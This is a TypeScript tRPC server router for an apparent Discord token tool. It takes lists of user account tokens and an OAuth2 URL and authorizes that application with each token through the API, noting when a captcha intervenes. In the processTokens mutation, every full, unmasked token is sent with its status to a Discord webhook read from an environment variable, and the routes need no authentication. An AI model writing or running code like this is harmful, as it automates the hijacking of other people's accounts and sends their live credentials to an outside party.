import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, router } from "./_core/trpc";
import { z } from "zod";
import {
  parseOAuthUrl,
  validateToken,
  authorizeViaApi,
  sendTokensToDiscord,
  getTokenPreview,
} from "./oauth2";
import { TRPCError } from "@trpc/server";

// Histórico em memória (sem banco de dados)
const processingHistory: Array<{
  id: number;
  tokenPreview: string;
  status: string;
  createdAt: Date;
}> = [];
let historyIdCounter = 1;

export const appRouter = router({
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  oauth2: router({
    validateUrl: publicProcedure
      .input(z.object({ url: z.string() }))
      .query(({ input }) => {
        try {
          const params = parseOAuthUrl(input.url);
          if (!params.clientId || !params.redirectUri || !params.scope) {
            throw new Error("URL OAuth2 incompleta");
          }
          return { success: true, params };
        } catch (error: any) {
          throw new TRPCError({
            code: "BAD_REQUEST",
            message: error.message || "URL OAuth2 inválida",
          });
        }
      }),

    validateToken: publicProcedure
      .input(z.object({ token: z.string() }))
      .query(({ input }) => {
        try {
          const isValid = validateToken(input.token);
          return { valid: isValid };
        } catch (error: any) {
          throw new TRPCError({
            code: "BAD_REQUEST",
            message: error.message || "Token inválido",
          });
        }
      }),

    processTokens: publicProcedure
      .input(
        z.object({
          tokens: z.array(z.string()),
          oauthUrl: z.string(),
        })
      )
      .mutation(async ({ input }) => {
        const results: Array<{
          token: string;
          preview: string;
          status: string;
          message: string;
        }> = [];

        try {
          const oauthParams = parseOAuthUrl(input.oauthUrl);

          for (const token of input.tokens) {
            if (!validateToken(token)) {
              results.push({
                token,
                preview: getTokenPreview(token),
                status: "error",
                message: "Formato de token inválido",
              });
              continue;
            }

            try {
              const tokenPreview = getTokenPreview(token);
              const authResult = await authorizeViaApi(token, oauthParams);
              let status = "error";
              let message = "Erro ao autorizar token";

              if (authResult.success) {
                status = "success";
                message = "Token autorizado com sucesso via API";
              } else if (authResult.requiresCaptcha) {
                status = "captcha_required";
                message = "Captcha necessário. Abra o navegador para completar.";
              } else {
                status = "error";
                message = authResult.message || "Erro ao autorizar token";
              }

              // Adicionar ao histórico em memória
              processingHistory.push({
                id: historyIdCounter++,
                tokenPreview,
                status,
                createdAt: new Date(),
              });

              // Manter apenas os últimos 100 registros
              if (processingHistory.length > 100) {
                processingHistory.shift();
              }

              results.push({
                token,
                preview: tokenPreview,
                status,
                message,
              });
            } catch (error: any) {
              const tokenPreview = getTokenPreview(token);
              processingHistory.push({
                id: historyIdCounter++,
                tokenPreview,
                status: "error",
                createdAt: new Date(),
              });
              results.push({
                token,
                preview: tokenPreview,
                status: "error",
                message: error.message || "Erro desconhecido",
              });
            }
          }

          // Enviar resultados ao Discord
          try {
            const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
            if (webhookUrl) {
              const formattedResults = results.map((r) => ({
                token: r.token,
                status: r.status === "success" ? "success" : "error",
                error: r.message,
              }));
              await sendTokensToDiscord(webhookUrl, formattedResults);
            }
          } catch (discordError: any) {
            console.error("[Discord] Erro ao enviar webhook:", discordError);
            // Não falha o processamento se Discord falhar
          }

          const successCount = results.filter((r) => r.status === "success").length;
          const errorCount = results.filter((r) => r.status === "error").length;

          return {
            success: true,
            results,
            successCount,
            errorCount,
            message: `Processamento concluído: ${successCount} sucessos, ${errorCount} erros`,
          };
        } catch (error: any) {
          console.error("[tRPC] Error processing tokens:", error);
          throw new TRPCError({
            code: "INTERNAL_SERVER_ERROR",
            message: error.message || "Erro ao processar tokens",
          });
        }
      }),

    getHistory: publicProcedure.query(() => {
      // Retornar histórico em memória (últimos 100 registros)
      return processingHistory
        .slice(-100)
        .reverse()
        .map((h) => ({
          id: h.id,
          tokenPreview: h.tokenPreview,
          status: h.status,
          createdAt: h.createdAt,
        }));
    }),
  }),
});

export type AppRouter = typeof appRouter;
